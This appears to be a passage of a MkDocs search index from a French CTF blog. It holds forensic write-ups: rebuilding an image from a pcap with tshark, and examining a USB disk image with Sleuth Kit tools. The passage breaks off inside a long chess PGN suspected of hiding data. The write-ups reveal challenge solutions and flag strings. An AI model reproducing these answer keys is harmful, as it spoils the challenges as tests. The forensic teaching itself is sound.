{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Bienvenue sur mon site ! Navigation Le wiki - Mes articles. Capture The Flag - Mes writes-Ups","title":"Welcome !"},{"location":"#bienvenue-sur-mon-site","text":"","title":"Bienvenue sur mon site !"},{"location":"#navigation","text":"Le wiki - Mes articles. Capture The Flag - Mes writes-Ups","title":"Navigation"},{"location":"ctf/bsidesbos/spycam/","text":"Spy Cam \u00c9nonc\u00e9 Oh no! I found some spyware on my laptop. Can you find out what the attacker saw? capture.pcap Analyse du trafic Dans cette capture, nous avons un grand trafic TCP avec une seule et unique requ\u00eate http : Cette requ\u00eate HTTP vient interroger un serveur web qui \u00e9coute sur le port 8081 pour r\u00e9cup\u00e9rer une image : Nous avons la r\u00e9ponse \u00e0 cette demande dans les trames TCP qui suivent. Il va donc falloir reconstituer l'image... R\u00e9cup\u00e9ration de l'image Nous savons que l'\u00e9metteur de l'image est le serveur qui \u00e9coute sur le port 8081... nous devons donc r\u00e9cup\u00e9rer les trames TCP qui proviennent de ce port : J'applique le filtre tcp.srcport == 8081 2000 trames ressortent, \u00e7a va \u00eatre compliqu\u00e9 de faire \u00e7a \u00e0 la main... un peu de tshark s'impose ! J'utilise la commande suivante pour extraitre les donn\u00e9es et reconstituer l'image : tshark -r capture.pcap -T fields -e tcp.segment_data -Y \"tcp.srcport == 8081\" |xxd -r -p >myimage.jpg Petit probl\u00e8me, on a un bout de la requ\u00eate HTTP dans le fichier image : Du coup je l'enl\u00e8ve \u00e0 la mano, et maintenant j'ai bien une image au format jpeg : Analyse de l'image Nous pouvons maintenant ouvrir l'image Okay cool... un t\u00e9l\u00e9phone ?... et maintenant ? R\u00e9cup\u00e9ration de donn\u00e9es dans l'image Le challenge est dans la cat\u00e9gorie forensic, je d\u00e9cide d'extraire quelques infos avec foremost ! Haha, il y avait des images cach\u00e9s ! Le t\u00e9l\u00e9phone \u00e0 l'air de faire d\u00e9filer un texte... Il ne reste plus qu'a reconstituer le flag : flag{i_spy_with_my_little_eye}","title":"Spy Cam"},{"location":"ctf/bsidesbos/spycam/#spy-cam","text":"","title":"Spy Cam"},{"location":"ctf/bsidesbos/spycam/#enonce","text":"Oh no! I found some spyware on my laptop. Can you find out what the attacker saw? capture.pcap","title":"\u00c9nonc\u00e9"},{"location":"ctf/bsidesbos/spycam/#analyse-du-trafic","text":"Dans cette capture, nous avons un grand trafic TCP avec une seule et unique requ\u00eate http : Cette requ\u00eate HTTP vient interroger un serveur web qui \u00e9coute sur le port 8081 pour r\u00e9cup\u00e9rer une image : Nous avons la r\u00e9ponse \u00e0 cette demande dans les trames TCP qui suivent. Il va donc falloir reconstituer l'image...","title":"Analyse du trafic"},{"location":"ctf/bsidesbos/spycam/#recuperation-de-limage","text":"Nous savons que l'\u00e9metteur de l'image est le serveur qui \u00e9coute sur le port 8081... nous devons donc r\u00e9cup\u00e9rer les trames TCP qui proviennent de ce port : J'applique le filtre tcp.srcport == 8081 2000 trames ressortent, \u00e7a va \u00eatre compliqu\u00e9 de faire \u00e7a \u00e0 la main... un peu de tshark s'impose ! J'utilise la commande suivante pour extraitre les donn\u00e9es et reconstituer l'image : tshark -r capture.pcap -T fields -e tcp.segment_data -Y \"tcp.srcport == 8081\" |xxd -r -p >myimage.jpg Petit probl\u00e8me, on a un bout de la requ\u00eate HTTP dans le fichier image : Du coup je l'enl\u00e8ve \u00e0 la mano, et maintenant j'ai bien une image au format jpeg :","title":"R\u00e9cup\u00e9ration de l'image"},{"location":"ctf/bsidesbos/spycam/#analyse-de-limage","text":"Nous pouvons maintenant ouvrir l'image Okay cool... un t\u00e9l\u00e9phone ?... et maintenant ?","title":"Analyse de l'image"},{"location":"ctf/bsidesbos/spycam/#recuperation-de-donnees-dans-limage","text":"Le challenge est dans la cat\u00e9gorie forensic, je d\u00e9cide d'extraire quelques infos avec foremost ! Haha, il y avait des images cach\u00e9s ! Le t\u00e9l\u00e9phone \u00e0 l'air de faire d\u00e9filer un texte... Il ne reste plus qu'a reconstituer le flag : flag{i_spy_with_my_little_eye}","title":"R\u00e9cup\u00e9ration de donn\u00e9es dans l'image"},{"location":"ctf/ecw2020/forensicqualification/","text":"Maker is dead Contexte Un maker est retrouv\u00e9 mort dans un incendie, les pompiers d\u00e9clarent que la cause de l'incendie provient d'une imprimante 3D. Dans l'incendie, ils r\u00e9cup\u00e8rent une clef usb et un raspberry pi \u00e0 analyser. Partie I Lord of War 1/4 Piste de recherche : flag.txt Pour commencer, nous avons deux images disques : Raw1.dd qui correspond \u00e0 la cl\u00e9 USB retrouv\u00e9 Raw2.dd qui correspond au raspberry Les 4 premi\u00e8res \u00e9tapes du challenge consiste \u00e0 r\u00e9cup\u00e9rer des informations dans le Raw1.dd Je commence par lister le contenu de cette image : onosh@siftworkstation:# file Raw1.dd Raw1.dd: DOS/MBR boot sector; partition 1 : ID=0x7, start-CHS (0x0,32,33), end-CHS (0x79,222,37), startsector 2048, 1955840 sectors onosh@siftworkstation:# mmls Raw1.dd DOS Partition Table Offset Sector: 0 Units are in 512-byte sectors Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0001957887 0001955840 NTFS / exFAT (0x07) Je d\u00e9couvre 3 partitions, dont une plus importante que les autres, la num\u00e9ro \"002\" qui contient un syst\u00e8me de fichier NTFS. Je d\u00e9cide de regarder ce quelle contient : onosh@siftworkstation:# fls -o 0000002048 -r -p Raw1.dd |grep -v '\\$' d/d 36-144-1: System Volume Information r/r 38-128-1: System Volume Information/IndexerVolumeGuid r/r 37-128-1: System Volume Information/WPSettings.dat -/r * 64-128-2: Flag.txt -/r * 65-128-2: Meow.pdf -/r * 66-128-2: Wiki.pdf -/d * 67-144-2: MrNigloR-S01 -/r * 68-128-2: MrNigloR-S01/MrNigloR-S01-ep1-VOST.mp4 -/r * 69-128-2: MrNigloR-S01/MrNigloR-S01-ep1.mp4 -/d * 70-144-2: PgnChessBook -/r * 71-128-2: PgnChessBook/Install_PgnChessBook.exe -/r * 72-128-2: PgnChessBook/READ_ME_FIRST.txt -/r * 73-128-2: PgnChessBook/my_best_game.pgn Un fichier \"Flag.txt\" int\u00e9ressant... \u00e7a semble \u00eatre ce que l'on cherche vu notre piste de recherche ! J'extrait le fichier : onosh@siftworkstation:# icat -o 0000002048 Raw1.dd 64-128-2 >flag.txt && cat flag.txt ECW{59b931696910632cd89986ccbf626e388055477e} J'ai mon premier flag ! ECW{59b931696910632cd89986ccbf626e388055477e} + 50 points Lord of War 2/4 Piste de recherche : WALLET Cette fois ci, on recherche quelque chose en rapport avec \"Wallet\" : Portefeuille Cryptomonnaie Bitcoin, Ethereum ? Je commence par chercher le mot cl\u00e9 dans l'image disque, mais sans succ\u00e8s : onosh@siftworkstation:# grep -rina 'WALLET' Raw1.dd onosh@siftworkstation:# strings Raw1.dd |grep -in 'wallet' Je d\u00e9cide donc d'approndir ma recherche dans les autres fichiers trouv\u00e9 pr\u00e9cemment ! J'ai \u00e0 ma disposition : 2 fichiers PDF 2 Vid\u00e9os Un jeu d'\u00e9chec Apr\u00e8s quelques recherches dans le fichier PDF et les vid\u00e9os, aucune information semble pertinente pour cette piste \"Wallet\", je d\u00e9cide d'\u00e9plucher le jeu d'\u00e9chec. Le fichier PgnChessBook/READ_ME_FIRST.txt nous apprend qu'il est possible \u00e0 partir du programme PgnChessBook/Install_PgnChessBook.exe d'importer une partie d'\u00e9chec si elle est au format .pgn, \u00e7a tombe bien nous avons le fichier PgnChessBook/my_best_game.pgn . J'\u00e9x\u00e9cute le programme et j'importe le fichier : Apr\u00e8s quelques tests de simulation de la partie, on se rend vite compte qu'elle n'a aucun sens car les deux joueurs placent leurs pions n'importe comment. Les donn\u00e9es contenue dans le fichier my_best_game.pgn semblent d'autant plus \u00e9trange : 1. g3 h5 2. h4 Nh6 3. d3 g5 4. a3 b6 5. Nh3 a5 6. Rh2 d5 7. c3 b5 8. Bg2 Na6 9. g4 Qd6 10. Bh1 Qg3 11. c4 Ng8 12. hxg5 Qxh3 13. Qb3 Bd7 14. e3 Bc6 15. Nc3 Bh6 16. Be4 Qf3 17. Rh1 Qxf2+ 18. Kxf2 e5 19. d4 dxe4 20. Na2 f5 21. Qd3 Ra7 22. Nb4 hxg4 23. Ke2 a4 24. Rd1 Bb7 25. Nc6 Kf8 26. Rh1 Nf6 27. Ke1 Nb4 28. Qe2 Na6 29. Nb4 Ba8 30. Rh2 Bb7 31. Qc2 Bc8 32. Qf2 Bxg5 33. Qh4 c5 34. Qh7 Rhxh7 35. Na2 Ra8 36. Kd1 Bb7 37. Bd2 Re7 38. cxb5 Nd5 39. Rh5 Rc8 40. Rh2 Kg7 41. Bc1 Bh6 42. Re2 Ree8 43. Kd2 g3 44. Rh2 Nf6 45. Rh3 Kg6 46. Kc3 Rc6 47. Kc2 Rf8 48. Nc3 Ne8 49. Rh5 Bc8 50. Rxh6+ Kf7 51. dxe5 Nb4+ 52. axb4 cxb4 53. Kb1 b3 54. e6+ Kg8 55. Nd5 f4 56. Rh1 Ba6 57. exf4 Rc2 58. Nc3 Kg7 59. Be3 Rc1+ 60. Bxc1 Nf6 61. Nxa4 Bc8 62. Rh8 Rf7 63. Rh2 Re7 64. Rf2 Rf7 65. Rh2 Nh7 66. Rxh7+ Kf8 67. Nc5 Rxf4 68. Rh6 Bb7 69. Ra7 Rf3 70. e7+ Ke8 71. Rh5 Bd5 72. Nd7 Be6 73. Rh3 Bg8 74. Ka1 Rf6 75. Rh2 Bd5 76. Ne5 Rf1 77. Nf7 Bc6 78. Ra4 Rxf7 79. Ra2 Rxe7 80. bxc6 Rh7 81. Rxh7 Kf8 82. Bh6+ Ke8 83. Ra5 Kd8 84. Rg5 Ke8 85. c7 e3 86. Rd7 e2 87. Rg8+ Kxd7 88. Re8 e1=B 89. c8=B+ Kc6 90. Rxe1 Kd5 91. Bf8 Kd4 92. Be7 Kd5 93. Re3 Kd4 94. Rxb3 g2 95. Rc3 Ke5 96. Ba6 g1=B 97. b4 Bc5 98. Rc1 Bd4+ 99. Ka2 Ke4 100. b5 Ba1 101. Rc5 Bh8 102. Kb3 Kd3 103. Kb4 Kd4 104. Ka5 Ke3 105. Bb7 Bf6 106. Ba6 Bg5 107. Ka4 Kd4 108. Rc3 Ke5 109. Rd3 Bd2 110. Rg3 Bg5 111. Ka3 Kd5 112. Bb4 Bh6 113. Rg7 Bd2 114. Ka2 Be1 115. Be7 Ba5 116. Bf8 Ke6 117. Be7 Bd8 118. Kb2 Bb6 119. Bg5 Bg1 120. Bd8 Kf5 121. Ka2 Be3 122. Rb7 Ba7 123. Kb1 Bb6 124. Rb8 Bg1 125. Kc1 Bf2 126. b6 Be3+ 127. Kd1 Bf4 128. Bb7 Ke5 129. Ra8 Ke6 130. Bh1 Bh2 131. Ra3 Bg1 132. Ra7 Be3 133. Bf6 Bh6 134. Ra3 Bf4 135. Bg2 Bc7 136. Ra8 Bxb6 137. Ra4 Ba5 138. Bd4 Bc3 139. Kc1 Ba5 140. Bh1 Kd6 141. Bc5+ Kd7 142. Bd5 Bb4 143. Bb3 Bd2+ 144. Kb2 Ke8 145. Bd5 Bh6 146. Kb3 Kd7 147. Be4 Bc1 148. Be3 Ke6 149. Ba7 Ke5 150. Be3 Bd2 151. Bf2 Ke6 152. Be3 Ba5 153. Rc4 Kd7 154. Bc6+ Ke7 155. Re4+ Kf8 156. Bb5 Bc7 157. Bf4 Kg7 158. Bg3 Kf6 159. Ka4 Be5 160. Ba6 Kg5 161. Ka5 Kf6 162. Bc8 Kg5 163. Bh4+ Kh6 164. Kb4 Bc3+ 165. Kc4 Bh8 166. Bf6 Kg6 167. Re2 Bxf6 168. Bf5+ Kh6 169. Bh3 Kg7 170. Kb5 Bg5 171. Re1 Kh6 172. Ka4 Kg6 173. Re4 Bf6 174. Bf1 Kg7 175. Rb4 Be5 176. Rb3 Bd6 177. Kb5 Kf8 178. Rb4 Be7 179. Bc4 Bd8 180. Bg8 Be7 181. Kc6 Bh4 182. Ra4 Ke8 183. Kc5 Bd8 184. Bd5 Bb6+ 185. Kb4 Ba7 186. Kc3 Bf2 187. Kd2 Kd8 188. Bb7 Ke8 189. Kc2 Kf8 190. Rd4 Ke8 191. Ra4 Ke7 192. Kc1 Bb6 193. Bf3 Ke6 194. Kc2 Kf6 195. Bd5 Ba7 196. Rg4 Bd4 197. Rxd4 Ke5 198. Rd1 Kf4 199. Rc1 Ke5 200. Kc3 Kf4 201. Kd4 Kf5 202. Rd1 Kg4 203. Ra1 Kh5 204. Kc3 Kg4 205. Bg8 Kf5 206. Ra4 Ke5 207. Ra3 Ke4 208. Ba2 Ke5 209. Bf7 Kf4 210. Bc4 Kg3 211. Ra8 Kh3 212. Bd5 Kg4 213. Bh1 Kf5 214. Rg8 Kf6 215. Bg2 Ke5 216. Rg7 Kf4 217. Kc2 Ke5 218. Kb2 Kd6 219. Rg8 Kd7 220. Bf1 Kc6 221. Bc4 Kc5 222. Ka2 Kd6 223. Ka3 Ke5 224. Bd5 Kf6 225. Ba8 Ke5 226. Rg5+ Kf4 227. Be4 Ke3 228. Bf3 Kd4 229. Rg8 Kc3 230. Ka2 Kc4 231. Kb2 Kb4 232. Be2 Ka5 233. Rb8 Ka4 234. Bf3 Ka5 235. Kb1 Ka6 236. Rb7 Ka5 237. Be2 Ka4 238. Rb4+ Ka5 239. Ka1 Kxb4 240. Bb5 Kb3 241. Bd7 Kc4 242. Ba4 Kc5 243. Ka2 Kd5 244. Kb1 Kd4 245. Be8 Ke4 246. Ka1 Kf3 247. Bd7 Kg2 248. Ba4 Kg1 249. Bd1 Kg2 250. Kb1 Kg1 251. Bg4 Kh2 252. Ka1 Kh1 253. Bh3 Kh2 254. Bf1 Kg3 255. Bb5 Kh2 256. Ka2 Kg1 257. Kb1 Kf2 258. Ba4 Ke1 259. Bd7 Kf1 260. Bc6 Kf2 261. Ba4 Kg3 262. Bb5 Kh3 263. Bd7+ Kh4 264. Ka2 Kh5 265. Bb5 Kg4 266. Be2+ Kh4 267. Kb3 Kg5 268. Bf3 Kf4 269. Ka4 Ke5 270. Ba8 Kd4 271. Be4 Ke5 272. Bh7 Kf6 273. Bg6 Ke6 274. Bb1 Kd6 275. Ka5 Kc7 276. Bg6 Kd7 277. Be8+ Kc8 278. Ba4 Kd8 279. Kb4 Kc7 280. Bc2 Kb8 281. Kc3 Ka8 282. Kd2 Kb8 283. Ke1 Ka8 284. Kf2 Kb7 285. Kg1 Ka6 286. Kh1 Kb6 287. Bf5 Kb7 288. Kg1 Ka8 289. Bg4 Kb7 290. Kf2 Kb8 291. Kf1 Kb7 292. Bf3+ Ka7 293. Bh1 Kb8 294. Kg1 Kc8 295. Bg2 Kb8 296. Kf2 Ka7 297. Bh1 Kb6 298. Bd5 Ka7 299. Be6 Ka8 300. Bg8 Kb8 301. Bh7 Kc8 302. Ke3 Kd8 303. Bb1 Ke8 304. Kd4 Kd7 305. Kd5 Kc7 306. Kc5 Kb8 307. Kb4 Ka8 308. Kc4 Ka7 309. Bf5 Ka6 310. Kb4 Kb7 311. Ka4 Kb8 312. Kb5 Ka7 313. Bh3 Kb8 314. Kc4 Kb7 315. Kd5 Ka6 316. Be6 Ka5 317. Bg8 Ka6 318. Ke6 Kb5 319. Kd6 Kb4 320. Kd5 Ka4 321. Ke5 Kb4 322. Bf7 Ka5 323. Kf5 Kb4 324. Kg6 Ka3 325. Kh7 Ka4 326. Be6 Ka3 327. Kg7 Kb2 328. Bd5 Kc1 329. Bc4 Kd1 330. Kh7 Kc1 331. Bg8 Kd2 332. Kh8 Kc1 333. Kg7 Kd2 334. Ba2 Ke3 335. Bg8 Kf2 336. Bc4 Kg1 337. Ba2 Kf1 338. Kh6 Ke1 339. Kh7 Kd1 340. Kg6 Kc1 341. Kh6 Kd1 342. Bf7 Kc1 343. Bg6 Kb2 344. Be4 Kb3 345. Bf5 Ka4 346. Bc8 Kb3 347. Bf5 Ka3 348. Kg5 Kb4 349. Kf4 Ka4 350. Ke5 Ka3 351. Kf6 Ka2 352. Ke6 Kb2 353. Bh3 Kb1 354. Ke5 Kb2 355. Ke4 Ka3 356. Ke5 Kb3 357. Bg2 Ka3 358. Be4 Kb2 359. Kd6 Kc3 360. Kd7 Kc4 361. Bg2 Kd4 362. Bh1 Kc4 363. Ba8 Kb5 364. Ke7 Kb4 365. Bd5 Kc3 366. Ke8 Kd3 367. Ke7 Kd4 368. Be6 Ke3 369. Ba2 Kf3 370. Bd5+ Ke3 371. Bh1 Kd2 372. Kf7 Kd1 373. Ke7 Kd2 374. Kf6 Kd3 375. Bb7 Kd4 376. Kg7 Kc3 377. Kh6 Kb3 378. Bd5+ Ka4 379. Bf3 Ka5 380. Be4 Ka4 381. Bh7 Kb5 382. Bd3+ Kb6 383. Bg6 Ka7 384. Be4 Kb6 385. Kg6 Ka6 386. Bb1 Kb5 387. Bd3+ Kb4 388. Kg7 Ka3 389. Bh7 Kb2 390. Be4 Ka1 391. Bg2 Ka2 392. Kh8 Kb1 393. Kg8 Kc1 394. Be4 Kb2 395. Bf5 Kc3 396. Bd7 Kc2 397. Be6 Kd1 398. Bb3+ Kc1 399. Ba4 Kb2 400. Bc2 Kc1 401. Bd3 Kd2 402. Kg7 Kxd3 403. Kf7 Kc4 404. Kf6 Kc3 405. Kg6 Kd4 406. Kf7 Ke3 407. Ke8 Kf2 408. Ke7 Kg2 409. Kd8 Kf3 410. Ke8 Ke4 411. Kf7 Kf3 412. Kf8 Ke4 413. Ke8 Kd3 414. Kd7 Kc4 415. Ke8 Kc5 416. Ke7 Kd4 417. Ke8 Kd5 418. Kf7 Kc6 419. Kg7 Kb5 420. Kf7 Kc4 421. Kf6 Kb3 422. Kf5 Kb2 423. Kf4 Ka2 424. Ke3 Kb3 425. Kf3 Kc4 426. Ke4 Kc5 427. Kf3 Kd5 428. Ke3 Ke5 429. Kf3 Kd4 430. Kg4 Ke4 431. Kg3 Ke3 432. Kh3 Kf4 433. Kg2 Kf5 434. Kh1 Kf4 435. Kg1 Ke5 436. Kh2 Kf5 437. Kh1 Kg5 438. Kg1 Kh6 439. Kg2 Kg6 440. Kf3 Kh7 441. Ke3 Kg6 442. Kf3 Kf6 443. Kg2 Kf5 444. Kh1 Ke6 445. Kh2 Kd5 446. Kh1 Kc4 447. Kh2 Kb5 448. Kg3 Ka6 449. Kf4 Ka5 450. Ke5 Kb5 451. Kf6 Kc6 452. Kg5 Kc7 453. Kf5 Kd6 454. Kf6 Kc5 455. Ke7 Kd4 456. Kd6 Kd3 457. Kd7 Kd2 458. Kd6 Kc2 459. Kc7 Kb1 460. Kc8 Kc2 461. Kc7 Kb1 462. Kc6 Kc1 463. Kb5 Kb1 464. Ka5 Ka2 465. Kb4 Kb2 466. Ka4 Kb1 467. Ka5 Kc2 468. Ka4 Kc1 469. Ka3 Kd2 470. Kb3 Ke2 471. Ka2 Kd3 472. Ka3 Kd4 473. Ka2 Ke3 474. Kb1 Kf2 475. Kc2 Kf1 476. Kb2 Kg2 477. Ka1 Kh2 478. Ka2 Kg3 479. Kb3 Kg2 480. Kc4 Kh3 481. Kd4 Kh2 482. Kc5 Kg3 483. Kb6 Kf2 484. Kb5 Kf1 485. Kb4 Kg1 486. Ka4 Kh2 487. Kb4 Kg2 488. Kb5 Kg3 489. Ka5 Kh2 490. Ka4 Kh3 491. Kb5 Kg2 492. Ka6 Kf3 493. Ka7 Ke3 494. Kb7 Ke2 495. Ka8 Ke3 496. Ka7 Kd4 497. Ka8 Kc4 498. Ka7 Kb3 499. Kb8 Kb4 500. Kc7 Ka3 501. Kd6 Kb3 502. Kc5 Kb2 503. Kb6 Ka3 504. Kc7 Kb2 505. Kc6 Kc3 506. Kd6 Kb3 507. Ke6 Ka2 508. Kd6 Kb3 509. Kc5 Kc2 510. Kd5 Kb3 511. Kc5 Ka2 512. Kb6 Ka1 513. Ka6 Kb1 514. Kb5 Kc1 515. Ka5 Kd2 516. Kb4 Kd3 517. Kb3 Ke4 518. Kc3 Ke5 519. Kb2 Kd6 520. Kc2 Kd5 521. Kb2 Kc6 522. Ka1 Kd6 523. Kb2 Ke7 524. Kc2 Kd6 525. Kc1 Ke5 526. Kd2 Kf5 527. Ke2 Kg4 528. Ke1 Kg5 529. Kf2 Kf6 530. Kg3 Kg6 531. Kf2 Kh7 532. Kf3 Kg7 533. Kf4 Kf6 534. Kf3 Kf7 535. Ke4 Ke6 536. Kd4 Kf7 537. Kd5 Kg6 538. Ke5 Kh7 539. Kd5 Kh6 540. Ke4 Kg6 541. Kd3 Kg7 542. Kc3 Kg8 543. Kb4 Kg7 544. Ka5 Kf7 545. Ka4 Ke8 546. Kb4 Kf8 547. Kc5 Ke8 548. Kd6 Kf8 549. Kc5 Ke8 550. Kc6 Kf8 551. Kb5 Kg7 552. Kb6 Kh8 553. Kb7 Kg8 554. Ka8 Kh7 555. Kb7 Kg7 556. Kc6 Kh8 557. Kb6 Kg7 558. Ka7 Kg8 559. Kb6 Kf8 560. Kc7 Ke7 561. Kc8 Ke8 562. Kb7 Kf7 563. Kc6 Ke6 564. Kb7 Kf7 565. Kc7 Kg8 566. Kd7 Kf7 567. Kc7 Ke6 568. Kc6 Kf6 569. Kc5 Kg5 570. Kb6 Kf4 571. Kc5 Kf5 572. Kc4 Ke5 573. Kb3 Kd5 574. Ka2 Kc5 575. Kb2 Kb4 576. Ka1 Ka5 577. Kb1 Ka4 578. Kc2 Kb4 579. Kb1 Ka4 580. Kc2 Kb4 581. Kb2 Kc5 582. Ka3 Kc6 583. Kb4 Kc7 584. Ka5 Kb7 585. Kb4 Ka6 586. Kb3 Kb5 587. Kc2 Ka5 588. Kb2 Ka4 589. Kc3 Kb5 590. Kb2 Ka4 591. Ka2 Kb5 592. Ka3 Ka5 593. Kb3 Kb6 594. Kc2 Ka7 595. Kc3 Ka8 596. Kc4 Kb7 597. Kc3 Ka6 598. Kc4 Kb7 599. Kd5 Ka7 600. Ke4 Kb8 601. Ke5 Kb7 602. Kd5 Ka8 603. Ke6 Ka7 604. Kd6 Ka8 605. Kd7 Kb7 606. Kd6 Kb6 607. Ke6 Ka6 608. Kf6 Ka5 609. Kf5 Kb5 610. Ke4 Ka5 611. Kf4 Kb5 612. Kf3 Ka6 613. Kg2 Kb6 614. Kf3 Kc6 615. Kf2 Kd6 616. Ke2 Ke6 617. Ke1 Kf5 618. Kd1 Kg6 619. Kd2 Kg7 620. Kd1 Kf6 621. Kc2 Ke5 622. Kb2 Kf5 623. Ka2 Ke6 624. Kb1 Ke5 625. Ka2 Kd5 626. Ka1 Ke4 627. Ka2 Ke3 628. Ka1 Kf2 629. Kb2 Ke1 630. Ka1 Kd2 631. Ka2 Ke3 632. Kb2 Kd2 633. Ka1 Kd1 634. Ka2 Kc1 635. Ka3 Kd1 636. Kb3 Kc1 637. Ka2 Kd2 638. Ka3 Kc3 639. Ka2 Kd2 640. Kb3 Kd3 641. Ka2 Ke3 642. Kb3 Kd4 643. Kc2 Ke5 644. Kb2 Kf6 645. Kc2 Ke7 646. Kb1 Kf6 647. Kb2 Kg7 648. Ka1 Kh7 649. Kb2 Kg6 650. Kb1 Kh5 651. Kc1 Kg6 652. Kb1 Kg5 653. Kb2 Kh6 654. Kc2 Kh7 655. Kd2 Kh8 656. Kd3 Kg8 657. Kd2 Kh8 658. Kc3 Kg8 659. Kb4 Kf7 660. Kb5 Kg8 661. Ka5 Kg7 662. Kb6 Kg6 663. Kc7 Kh6 664. Kb8 Kh5 665. Ka8 Kg6 666. Kb7 Kh6 667. Kc8 Kg6 668. Kb7 Kf6 669. Kc6 Kf5 670. Kb6 Kf6 671. Kc6 Ke6 672. Kc7 Kd5 673. Kb7 Ke5 674. Ka8 Ke6 675. Kb8 Kd5 676. Kc8 Ke5 677. Kd7 Kf4 678. Ke8 Kg5 679. Kf8 Kh6 680. Ke7 Kg5 681. Kd8 Kf6 682. Kd7 Kg6 683. Ke6 Kg7 684. Ke5 Kf7 685. Ke4 Kf8 686. Kd3 Ke7 687. Ke3 Kd8 688. Kf2 Kc8 689. Kf3 Kb8 690. Kf2 Ka8 691. Kg3 Ka7 692. Kf3 Kb7 693. Kf2 Kc6 694. Ke2 Kb5 695. Kf2 Kb6 696. Kg1 Kb7 697. Kf1 Ka6 698. Kg1 Kb5 699. Kh2 Kb4 700. Kg1 Ka4 701. Kg2 Ka5 702. Kh3 Kb4 703. Kh4 Kb5 704. Kg3 Kc5 705. Kg4 Kd5 706. Kf4 Kc6 707. Kg3 Kb6 708. Kh2 Ka7 709. Kh3 Kb6 710. Kg4 Kb5 711. Kh3 Ka6 712. Kg2 Ka5 713. Kg1 Kb4 714. Kh1 Ka3 715. Kh2 Kb4 716. Kh1 Kc5 717. Kg1 Kd4 718. Kf1 Kc4 719. Ke1 Kc3 720. Kd1 Kb3 721. Ke2 Kb2 722. Kf3 Ka3 723. Kg3 Kb4 724. Kf3 Ka3 725. Kf4 Kb2 726. Kf3 Kb3 727. Kg2 Ka4 728. Kh2 Kb3 729. Kg3 Ka2 730. Kf2 Ka3 731. Ke3 Ka2 732. Kf2 Kb3 733. Kg3 Kb4 734. Kg2 Kb5 735. Kf2 Kb6 736. Kg1 Ka5 737. Kf1 Kb5 738. Kf2 Kc6 739. Kf1 Kd5 740. Kf2 Kc4 741. Kg3 Kc3 742. Kf3 Kb2 743. Kg4 Kc3 744. Kh3 Kd3 745. Kg3 Ke4 746. Kh3 Kd3 747. Kg3 Ke4 748. Kf2 Kf5 749. Ke3 Kg5 750. Kd2 Kh6 751. Ke3 Kg7 752. Kf3 Kf8 753. Ke3 Ke8 754. Ke2 Ke7 755. Kd2 Kf6 756. Kd1 Ke7 757. Kc1 Kf7 758. Kb2 Ke7 759. Kb3 Kd8 760. Kc3 Kd7 761. Kd3 Ke7 762. Ke3 Kd6 763. Kf2 Kd5 764. Kf1 Kc5 765. Kf2 Kc6 766. Kf1 Kb6 767. Kg1 Kb7 768. Kh2 Kc7 769. Kh3 Kb8 770. Kg3 Kc8 771. Kg4 Kb8 772. Kh5 Kc8 773. Kh6 Kb8 774. Kg6 Ka7 775. Kh6 Kb8 776. Kg6 Kc7 777. Kh5 Kc6 778. Kg6 Kc5 779. Kg5 Kc4 780. Kh6 Kd5 781. Kg7 Kc4 782. Kg8 Kb5 783. Kh8 Kb6 784. Kg7 Ka7 785. Kh7 Kb6 786. Kg7 Kc6 787. Kf8 Kd6 788. Kf7 Kc5 789. Kg8 Kd6 790. Kf7 Kc7 791. Kg7 Kb8 792. Kh7 Ka8 793. Kh6 Kb8 794. Kh5 Ka8 795. Kg4 Kb7 796. Kh5 Kb6 797. Kg6 Ka5 798. Kf6 Ka6 799. Ke7 Kb6 800. Kd6 Ka6 801. Ke6 Kb5 802. Kd5 Ka5 803. Kc4 Kb6 804. Kd3 Ka5 805. Kc3 Kb6 806. Kc4 Kc6 807. Kb3 Kc7 808. Ka3 Kb8 809. Kb2 Ka8 810. Kc1 Ka7 811. Kb2 Kb6 812. Ka3 Kb7 813. Ka4 Kc7 814. Kb5 Kc8 815. Kb6 Kd8 816. Kb7 Kd7 817. Ka8 Ke8 818. Ka7 Ke7 819. Ka8 Kf8 820. Ka7 Ke8 821. Ka6 Ke7 822. Kb5 Kd6 823. Kb4 Kd7 824. Kb5 Kd8 825. Ka6 Ke8 826. Ka5 Ke7 827. Kb6 Kd8 828. Ka7 Kc8 829. Ka8 Kc7 830. Ka7 Kd7 831. Kb7 Kd8 832. Ka6 Ke7 833. Kb5 Kf8 834. Ka6 Ke8 835. Ka7 Kd7 836. Ka8 Kc8 837. Ka7 Kc7 838. Ka6 Kd8 839. Ka7 Kc7 840. Ka8 Kc6 841. Kb8 Kc5 842. Kc7 Kd4 843. Kc8 Kc4 844. Kd8 Kc3 845. Kc7 Kd2 846. Kd7 Kd3 847. Ke6 Kd4 848. Kf7 Ke3 849. Kg8 Kd3 850. Kf7 Kd2 851. Kf8 Kc3 852. Kg7 Kd3 853. Kh8 Kc3 854. Kg8 Kc4 855. Kh7 Kb5 856. Kh6 Kc6 857. Kg6 Kd6 858. Kg7 Kc7 859. Kf8 Kc6 860. Kg8 Kd7 861. Kg7 Kd8 862. Kf8 Kc7 863. Kg8 Kb8 864. Kh7 Kc8 865. Kh8 Kb8 866. Kh7 Kc7 867. Kg7 Kb7 868. Kf6 Kc8 869. Ke7 Kb8 870. Kd7 Kb7 871. Kd6 Kb8 872. Kc6 Kc8 873. Kb5 Kb7 874. Kc5 Kb8 875. Kd5 Ka7 876. Kc6 Kb8 877. Kd5 Kc7 878. Kc5 Kd7 879. Kd5 Ke7 880. Kc4 Kf7 881. Kc5 Ke8 882. Kc4 Ke7 883. Kb4 Kd8 884. Ka3 Kd7 885. Kb4 Kc7 886. Kb3 Kb6 887. Kb4 Kc6 888. Kc3 Kb6 889. Kc2 Kc7 890. Kc3 Kb6 891. Kb3 Kc6 892. Ka2 Kd6 893. Kb3 Ke5 894. Ka4 Ke4 895. Ka5 Kf3 896. Ka6 Kg2 897. Kb7 Kh2 898. Kb6 Kg1 899. Kb5 Kg2 900. Kc5 Kh2 901. Kb5 Kg3 902. Kc5 Kf2 903. Kb4 Kf3 904. Ka5 Kg3 905. Kb6 Kf4 906. Kc6 Kf5 907. Kb7 Ke5 908. Ka6 Kd6 909. Kb6 Kd7 910. Ka5 Kd6 911. Kb6 Kd7 912. Ka6 Ke7 913. Kb5 Ke6 914. Ka5 Kd6 915. Kb6 Ke7 916. Kc5 Ke8 917. Kc6 Kd8 918. Kb7 Kd7 919. Ka8 Kd8 920. Ka7 Kc7 921. Ka8 Kb6 